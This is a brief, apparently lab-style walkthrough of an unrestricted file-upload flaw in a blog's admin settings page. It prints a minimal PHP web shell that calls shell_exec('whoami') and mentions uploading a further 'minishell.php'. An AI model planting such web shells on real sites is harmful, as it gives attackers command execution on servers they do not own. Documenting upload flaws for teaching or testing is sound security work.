After Login into admin in blog then go to settings and files upload these files and run
Here there no restrictions to upload a particular file
By uploading a shell page we can get the admin name and we know the password then we can login into admin
shell.php :-
	<?php
		echo shell_exec("whoami");
	?>
we can use minishell.php :- you can copy from the senstive Data Exposure Directory

I added a Calucutor code :- you can copy from the senstive Data Exposure Directory
